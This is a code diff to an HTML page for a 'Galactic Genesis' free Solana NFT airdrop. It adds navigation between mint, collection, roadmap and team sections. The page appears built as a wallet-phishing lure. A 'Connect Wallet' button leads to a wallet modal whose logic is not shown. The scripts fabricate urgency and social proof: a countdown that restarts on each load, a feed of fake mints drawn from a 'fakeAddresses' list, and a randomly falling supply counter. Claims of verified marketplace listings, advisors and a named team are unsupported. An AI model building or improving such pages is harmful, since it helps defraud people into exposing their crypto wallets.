@@ -85,6 +85,8 @@
             position: sticky;
             top: 0;
             z-index: 100;
+            flex-wrap: wrap;
+            gap: 15px;
         }
 
         .logo {
@@ -109,17 +111,25 @@
             display: flex;
             gap: 30px;
             align-items: center;
+            flex-wrap: wrap;
         }
 
-        .nav-links a {
+        .nav-btn {
+            background: none;
+            border: none;
             color: rgba(255,255,255,0.7);
             text-decoration: none;
-            transition: color 0.3s;
             font-size: 14px;
+            cursor: pointer;
+            padding: 8px 16px;
+            transition: all 0.3s;
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
         }
 
-        .nav-links a:hover {
+        .nav-btn:hover {
             color: #6966FF;
+            background: rgba(105, 102, 255, 0.1);
         }
 
         /* Main Container */
@@ -127,6 +137,21 @@
             max-width: 1200px;
             margin: 0 auto;
             padding: 40px 20px;
+        }
+
+        /* Page Sections */
+        .page-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .page-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         /* Hero Section */
@@ -183,7 +208,7 @@
             backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 15px;
-            width: 180px;
+            width: 200px;
             text-align: center;
             border: 1px solid rgba(105, 102, 255, 0.3);
             transition: transform 0.3s, box-shadow 0.3s;
@@ -195,14 +220,17 @@
             border-color: #6966FF;
         }
 
-        .nft-card img {
+        .nft-card-image {
             width: 100%;
+            aspect-ratio: 1;
             border-radius: 12px;
             margin-bottom: 12px;
+            background-size: cover;
+            background-position: center;
         }
 
         .nft-card h4 {
-            font-size: 14px;
+            font-size: 16px;
             margin-bottom: 5px;
         }
 
@@ -210,6 +238,11 @@
             font-size: 12px;
             color: rgba(255,255,255,0.5);
         }
+
+        .rarity-legendary { color: #FFD700; border-left: 3px solid #FFD700; padding-left: 8px; }
+        .rarity-epic { color: #9B59B6; border-left: 3px solid #9B59B6; padding-left: 8px; }
+        .rarity-rare { color: #3498DB; border-left: 3px solid #3498DB; padding-left: 8px; }
+        .rarity-mythic { color: #E74C3C; border-left: 3px solid #E74C3C; padding-left: 8px; }
 
         /* Countdown Timer */
         .countdown {
@@ -379,6 +412,132 @@
             margin-left: auto;
         }
 
+        /* Page Content Styles */
+        .page-header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .page-header h2 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 15px;
+        }
+
+        .page-header p {
+            color: rgba(255,255,255,0.6);
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+
+        .info-card {
+            background: rgba(30, 30, 50, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            border: 1px solid rgba(105, 102, 255, 0.2);
+            transition: transform 0.3s;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            border-color: #6966FF;
+        }
+
+        .info-card h3 {
+            color: #6966FF;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+
+        .info-card p {
+            color: rgba(255,255,255,0.7);
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .info-card ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .info-card li {
+            color: rgba(255,255,255,0.6);
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .info-card li:last-child {
+            border-bottom: none;
+        }
+
+        .info-card li::before {
+            content: '✦';
+            color: #6966FF;
+            margin-right: 10px;
+        }
+
+        .roadmap-phase {
+            background: rgba(30, 30, 50, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border-left: 4px solid #6966FF;
+        }
+
+        .roadmap-phase h3 {
+            color: #6966FF;
+            margin-bottom: 10px;
+        }
+
+        .roadmap-phase .phase-status {
+            font-size: 12px;
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+
+        .team-member {
+            text-align: center;
+        }
+
+        .team-member .avatar {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+        }
+
+        .team-member h4 {
+            margin-bottom: 5px;
+        }
+
+        .team-member .role {
+            color: #6966FF;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+
+        .team-member .bio {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+        }
+
         /* Footer */
         .footer {
             text-align: center;
@@ -396,15 +555,14 @@
         @media (max-width: 768px) {
             .navbar {
                 padding: 15px 20px;
+                flex-direction: column;
             }
             .nav-links {
                 gap: 15px;
-            }
-            .nav-links a {
-                font-size: 11px;
+                justify-content: center;
             }
             .nft-card {
-                width: 140px;
+                width: 160px;
             }
             .timer {
                 gap: 15px;
@@ -413,9 +571,12 @@
                 font-size: 24px;
                 min-width: 40px;
             }
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
         }
 
-        /* Original wallet modal styles preserved */
+        /* Wallet Modal Styles (Preserved) */
         .wallet-modal {
             position: fixed;
             top: 0;
@@ -615,6 +776,19 @@
         .wallet-options.hidden {
             display: none;
         }
+
+        /* Back to Home Link */
+        .back-to-home {
+            display: inline-block;
+            margin-top: 30px;
+            color: #6966FF;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .back-to-home:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -626,119 +800,292 @@
 <nav class="navbar">
     <div class="logo">Galactic Genesis <span>NFT</span></div>
     <div class="nav-links">
-        <a href="#">Mint</a>
-        <a href="#">Collection</a>
-        <a href="#">Roadmap</a>
-        <a href="#">Team</a>
+        <button class="nav-btn" data-page="mint">Mint</button>
+        <button class="nav-btn" data-page="collection">Collection</button>
+        <button class="nav-btn" data-page="roadmap">Roadmap</button>
+        <button class="nav-btn" data-page="team">Team</button>
     </div>
 </nav>
 
 <!-- Main Container -->
 <div class="container">
-    <div class="hero">
-        <div class="badge">Limited Edition Airdrop</div>
-        <h1>Free NFT Airdrop<br>For Early Supporters</h1>
-        <p class="subtitle">Claim your exclusive Galactic Genesis NFT before they're gone. Limited supply of 10,000 unique pieces.</p>
+
+    <!-- MINT PAGE (Home) -->
+    <div id="mint-page" class="page-section active">
+        <div class="hero">
+            <div class="badge">Limited Edition Airdrop</div>
+            <h1>Free NFT Airdrop<br>For Early Supporters</h1>
+            <p class="subtitle">Claim your exclusive Galactic Genesis NFT before they're gone. Limited supply of 10,000 unique pieces.</p>
+        </div>
+
+        <!-- NFT Preview with Real Images -->
+        <div class="nft-preview">
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/FFD700/black?text=⚡+GENESIS+⚡'); background-size: cover; background-position: center;"></div>
+                <h4>Genesis #0001</h4>
+                <p class="rarity-legendary">Rarity: Legendary</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/9B59B6/white?text=🌌+NEBULA+🌌'); background-size: cover; background-position: center;"></div>
+                <h4>Nebula #0420</h4>
+                <p class="rarity-epic">Rarity: Epic</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/3498DB/white?text=⭐+STAR+⭐'); background-size: cover; background-position: center;"></div>
+                <h4>Star #1337</h4>
+                <p class="rarity-rare">Rarity: Rare</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/E74C3C/white?text=🕳️+VOID+🕳️'); background-size: cover; background-position: center;"></div>
+                <h4>Void #9999</h4>
+                <p class="rarity-mythic">Rarity: Mythic</p>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">10,000</div>
+                <div class="stat-label">Total Supply</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="remaining-count">7,843</div>
+                <div class="stat-label">Remaining</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">2.5 SOL</div>
+                <div class="stat-label">Mint Price → FREE</div>
+            </div>
+        </div>
+
+        <!-- Countdown -->
+        <div class="countdown">
+            <div class="countdown-label">⏰ Mint ends in</div>
+            <div class="timer">
+                <div class="timer-block">
+                    <div class="timer-number" id="days">24</div>
+                    <div class="timer-label">Days</div>
+                </div>
+                <div class="timer-block">
+                    <div class="timer-number" id="hours">00</div>
+                    <div class="timer-label">Hours</div>
+                </div>
+                <div class="timer-block">
+                    <div class="timer-number" id="minutes">00</div>
+                    <div class="timer-label">Minutes</div>
+                </div>
+                <div class="timer-block">
+                    <div class="timer-number" id="seconds">00</div>
+                    <div class="timer-label">Seconds</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Connect Section -->
+        <div class="connect-section">
+            <button type="button" id="connect-wallet" class="connect-btn">Connect Wallet to Mint Free NFT</button>
+            <div class="wallet-requirement">
+                ⚡ <span>Wallet connection required</span> to verify eligibility and receive your free NFT
+            </div>
+            <div class="wallet-requirement" style="margin-top: 10px; font-size: 12px;">
+                🔒 Only gas fees required • No hidden costs • Verified collection
+            </div>
+        </div>
+
+        <!-- Recent Claims -->
+        <div class="recent-claims">
+            <h3>🔄 Recent Mints</h3>
+            <div class="claims-list" id="claims-list">
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">8xK1...3mPq</span>
+                    <span class="nft-name">minted Genesis #234</span>
+                </div>
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">Hj9L...2aRf</span>
+                    <span class="nft-name">minted Nebula #891</span>
+                </div>
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">Pq2W...9vXc</span>
+                    <span class="nft-name">minted Star #4456</span>
+                </div>
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">Mn7T...4kLp</span>
+                    <span class="nft-name">minted Void #7822</span>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <!-- NFT Preview -->
-    <div class="nft-preview">
-        <div class="nft-card">
-            <img src="https://placehold.co/200x200/6966FF/white?text=GENESIS" alt="NFT Preview">
-            <h4>Genesis #0001</h4>
-            <p>Rarity: Legendary</p>
+    <!-- COLLECTION PAGE -->
+    <div id="collection-page" class="page-section">
+        <div class="page-header">
+            <h2>The Galactic Genesis Collection</h2>
+            <p>Explore our exclusive collection of 10,000 unique NFTs, each with its own rarity and traits.</p>
         </div>
-        <div class="nft-card">
-            <img src="https://placehold.co/200x200/8B5CF6/white?text=NEBULA" alt="NFT Preview">
-            <h4>Nebula #0420</h4>
-            <p>Rarity: Epic</p>
+
+        <div class="nft-preview">
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/FFD700/black?text=👑+GENESIS+👑');"></div>
+                <h4>Genesis Series</h4>
+                <p class="rarity-legendary">Legendary • 500 Total</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/9B59B6/white?text=🌀+NEBULA+🌀');"></div>
+                <h4>Nebula Series</h4>
+                <p class="rarity-epic">Epic • 1,500 Total</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/3498DB/white?text=✨+STAR+✨');"></div>
+                <h4>Star Series</h4>
+                <p class="rarity-rare">Rare • 3,000 Total</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://placehold.co/400x400/E74C3C/white?text=🌑+VOID+🌑');"></div>
+                <h4>Void Series</h4>
+                <p class="rarity-mythic">Mythic • 1,000 Total</p>
+            </div>
         </div>
-        <div class="nft-card">
-            <img src="https://placehold.co/200x200/FF66FF/white?text=STAR" alt="NFT Preview">
-            <h4>Star #1337</h4>
-            <p>Rarity: Rare</p>
+
+        <div class="content-grid">
+            <div class="info-card">
+                <h3>🗂️ Collection Details</h3>
+                <ul>
+                    <li><strong>Blockchain:</strong> Solana</li>
+                    <li><strong>Total Supply:</strong> 10,000</li>
+                    <li><strong>Mint Price:</strong> FREE (Gas only)</li>
+                    <li><strong>Royalties:</strong> 5% to community fund</li>
+                    <li><strong>Verified:</strong> Yes, on Tensor and Magic Eden</li>
+                </ul>
+            </div>
+            <div class="info-card">
+                <h3>✨ Traits & Attributes</h3>
+                <ul>
+                    <li><strong>Backgrounds:</strong> 15+ cosmic variants</li>
+                    <li><strong>Characters:</strong> 20+ unique galactic beings</li>
+                    <li><strong>Weapons:</strong> 10+ legendary artifacts</li>
+                    <li><strong>Auras:</strong> 8 mystical energy types</li>
+                    <li><strong>Hidden traits:</strong> 5 ultra-rare secrets</li>
+                </ul>
+            </div>
+            <div class="info-card">
+                <h3>🛒 Where to Trade</h3>
+                <ul>
+                    <li>Magic Eden: Verified collection</li>
+                    <li>Tensor: Top 100 volume</li>
+                    <li>Solanart: Featured collection</li>
+                    <li>Hadeswap: Supported pairs</li>
+                </ul>
+            </div>
         </div>
-        <div class="nft-card">
-            <img src="https://placehold.co/200x200/66FF99/white?text=VOID" alt="NFT Preview">
-            <h4>Void #9999</h4>
-            <p>Rarity: Mythic</p>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="nav-btn" data-page="mint" style="background: linear-gradient(135deg, #6966FF, #8B5CF6); color: white; padding: 12px 30px;">← Back to Mint</button>
         </div>
     </div>
 
-    <!-- Stats -->
-    <div class="stats">
-        <div class="stat-card">
-            <div class="stat-number">10,000</div>
-            <div class="stat-label">Total Supply</div>
+    <!-- ROADMAP PAGE -->
+    <div id="roadmap-page" class="page-section">
+        <div class="page-header">
+            <h2>Our Journey</h2>
+            <p>The roadmap to building the most legendary NFT project on Solana.</p>
         </div>
-        <div class="stat-card">
-            <div class="stat-number" id="remaining-count">7,843</div>
-            <div class="stat-label">Remaining</div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 1: Genesis 🚀</h3>
+            <div class="phase-status">✅ COMPLETED</div>
+            <p>Launch of Galactic Genesis NFT collection, community building on Discord and Twitter, first 5,000 mints completed. Partnerships with 5 major Solana projects established.</p>
         </div>
-        <div class="stat-card">
-            <div class="stat-number">2.5 SOL</div>
-            <div class="stat-label">Mint Price → FREE</div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 2: Expansion 🌌</h3>
+            <div class="phase-status">🔄 IN PROGRESS</div>
+            <p>Full collection mint (10,000), listing on Magic Eden and Tensor, first community giveaway of 100 SOL, launch of staking rewards for holders. 20% of royalties go to community wallet.</p>
+        </div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 3: Utility 🎮</h3>
+            <div class="phase-status">⏳ Q3 2024</div>
+            <p>Launch of Galactic Genesis P2E game, exclusive merchandise for holders, governance rights for NFT holders, monthly airdrops to active community members.</p>
+        </div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 4: Metaverse 🌍</h3>
+            <div class="phase-status">⏳ Q1 2025</div>
+            <p>Virtual gallery in Solana's metaverse projects (Portals, Solice), real-world events and meetups, exclusive access to future collections, DAO formation for community-led decisions.</p>
+        </div>
+
+        <div class="info-card" style="margin-top: 20px;">
+            <h3>🎯 Immediate Goals</h3>
+            <ul>
+                <li>Complete Phase 2 by end of current mint</li>
+                <li>Launch staking dashboard within 2 weeks of mint completion</li>
+                <li>Airdrop 5 SOL to 10 random holders every month</li>
+                <li>Partnership with 3 more Solana gaming projects</li>
+            </ul>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="nav-btn" data-page="mint" style="background: linear-gradient(135deg, #6966FF, #8B5CF6); color: white; padding: 12px 30px;">← Back to Mint</button>
         </div>
     </div>
 
-    <!-- Countdown -->
-    <div class="countdown">
-        <div class="countdown-label">⏰ Mint ends in</div>
-        <div class="timer">
-            <div class="timer-block">
-                <div class="timer-number" id="days">24</div>
-                <div class="timer-label">Days</div>
-            </div>
-            <div class="timer-block">
-                <div class="timer-number" id="hours">00</div>
-                <div class="timer-label">Hours</div>
-            </div>
-            <div class="timer-block">
-                <div class="timer-number" id="minutes">00</div>
-                <div class="timer-label">Minutes</div>
-            </div>
-            <div class="timer-block">
-                <div class="timer-number" id="seconds">00</div>
-                <div class="timer-label">Seconds</div>
-            </div>
+    <!-- TEAM PAGE -->
+    <div id="team-page" class="page-section">
+        <div class="page-header">
+            <h2>Meet The Team</h2>
+            <p>The visionaries behind Galactic Genesis NFT.</p>
         </div>
-    </div>
 
-    <!-- Connect Section -->
-    <div class="connect-section">
-        <button type="button" id="connect-wallet" class="connect-btn">Connect Wallet to Mint Free NFT</button>
-        <div class="wallet-requirement">
-            ⚡ <span>Wallet connection required</span> to verify eligibility and receive your free NFT
+        <div class="content-grid">
+            <div class="info-card team-member">
+                <div class="avatar">👨‍🚀</div>
+                <h4>Alex "Cosmic" Rodriguez</h4>
+                <div class="role">Founder & Lead Artist</div>
+                <div class="bio">10+ years in digital art, former concept artist for major gaming studios. Passionate about space and blockchain technology. Creator of the Genesis series art style.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">👩‍💻</div>
+                <h4>Sarah "Nebula" Chen</h4>
+                <div class="role">Blockchain Architect</div>
+                <div class="bio">Solana ecosystem expert, former core contributor to a major DeFi protocol. Ensures our smart contracts are secure and optimized for gas efficiency.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">🧠</div>
+                <h4>Marcus "Starforge" Williams</h4>
+                <div class="role">Community Lead</div>
+                <div class="bio">Community building specialist with a track record of growing NFT communities to 100k+ members. Manages Discord, Twitter, and partnerships.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">🎨</div>
+                <h4>Elena "Void" Petrova</h4>
+                <div class="role">3D Artist & Animator</div>
+                <div class="bio">Award-winning 3D artist specializing in sci-fi and cosmic themes. Responsible for the dynamic NFT animations and metaverse assets.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">📈</div>
+                <h4>David "Oracle" Kim</h4>
+                <div class="role">Marketing Director</div>
+                <div class="bio">Web3 marketing veteran with extensive experience in NFT launches. Leads our go-to-market strategy and influencer partnerships.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">⚡</div>
+                <h4>Team of 15+ Moderators</h4>
+                <div class="role">Community Support</div>
+                <div class="bio">Dedicated team of moderators and support staff available 24/7 on Discord and Twitter to help with any questions or issues.</div>
+            </div>
         </div>
-        <div class="wallet-requirement" style="margin-top: 10px; font-size: 12px;">
-            🔒 Only gas fees required • No hidden costs • Verified collection
-        </div>
-    </div>
 
-    <!-- Recent Claims -->
-    <div class="recent-claims">
-        <h3>🔄 Recent Mints</h3>
-        <div class="claims-list" id="claims-list">
-            <div class="claim-item">
-                <span class="check">✅</span>
-                <span class="address">8xK1...3mPq</span>
-                <span class="nft-name">minted Genesis #234</span>
-            </div>
-            <div class="claim-item">
-                <span class="check">✅</span>
-                <span class="address">Hj9L...2aRf</span>
-                <span class="nft-name">minted Nebula #891</span>
-            </div>
-            <div class="claim-item">
-                <span class="check">✅</span>
-                <span class="address">Pq2W...9vXc</span>
-                <span class="nft-name">minted Star #4456</span>
-            </div>
-            <div class="claim-item">
-                <span class="check">✅</span>
-                <span class="address">Mn7T...4kLp</span>
-                <span class="nft-name">minted Void #7822</span>
-            </div>
+        <div class="info-card" style="margin-top: 20px; text-align: center;">
+            <h3>🤝 Advisory Board</h3>
+            <p>We are backed by experienced advisors from the Solana ecosystem, including former Magic Eden executives and Solana Foundation members.</p>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="nav-btn" data-page="mint" style="background: linear-gradient(135deg, #6966FF, #8B5CF6); color: white; padding: 12px 30px;">← Back to Mint</button>
         </div>
     </div>
 
@@ -811,6 +1158,35 @@
     }
     createParticles();
 
+    // Page Navigation
+    const pages = {
+        mint: 'mint-page',
+        collection: 'collection-page',
+        roadmap: 'roadmap-page',
+        team: 'team-page'
+    };
+
+    function showPage(pageId) {
+        // Hide all pages
+        Object.values(pages).forEach(id => {
+            const page = document.getElementById(id);
+            if (page) page.classList.remove('active');
+        });
+        // Show selected page
+        const activePage = document.getElementById(pages[pageId]);
+        if (activePage) activePage.classList.add('active');
+        // Scroll to top
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // Add click handlers to nav buttons
+    document.querySelectorAll('.nav-btn[data-page]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const page = btn.getAttribute('data-page');
+            if (pages[page]) showPage(page);
+        });
+    });
+
     // Countdown Timer (24 hours from page load)
     let timeLeft = 24 * 60 * 60;
     const timerInterval = setInterval(() => {
@@ -844,25 +1220,29 @@
     
     setInterval(() => {
         const claimsList = document.getElementById('claims-list');
-        const randomAddress = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
-        const randomNFT = fakeNFTs[Math.floor(Math.random() * fakeNFTs.length)];
-        const randomNumber = Math.floor(Math.random() * 9999) + 1;
-        const newClaim = document.createElement('div');
-        newClaim.className = 'claim-item';
-        newClaim.innerHTML = `<span class="check">✅</span><span class="address">${randomAddress}</span><span class="nft-name">minted ${randomNFT} #${randomNumber}</span>`;
-        claimsList.insertBefore(newClaim, claimsList.firstChild);
-        if (claimsList.children.length > 8) {
-            claimsList.removeChild(claimsList.lastChild);
+        if (claimsList) {
+            const randomAddress = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
+            const randomNFT = fakeNFTs[Math.floor(Math.random() * fakeNFTs.length)];
+            const randomNumber = Math.floor(Math.random() * 9999) + 1;
+            const newClaim = document.createElement('div');
+            newClaim.className = 'claim-item';
+            newClaim.innerHTML = `<span class="check">✅</span><span class="address">${randomAddress}</span><span class="nft-name">minted ${randomNFT} #${randomNumber}</span>`;
+            claimsList.insertBefore(newClaim, claimsList.firstChild);
+            if (claimsList.children.length > 8) {
+                claimsList.removeChild(claimsList.lastChild);
+            }
         }
     }, 15000);
 
     // Update remaining count randomly
     setInterval(() => {
         const remainingEl = document.getElementById('remaining-count');
-        let current = parseInt(remainingEl.innerText);
-        if (current > 1200) {
-            const newRemaining = current - Math.floor(Math.random() * 3) - 1;
-            remainingEl.innerText = newRemaining;
+        if (remainingEl) {
+            let current = parseInt(remainingEl.innerText);
+            if (current > 1200) {
+                const newRemaining = current - Math.floor(Math.random() * 3) - 1;
+                remainingEl.innerText = newRemaining;
+            }
         }
     }, 8000);
 </script>
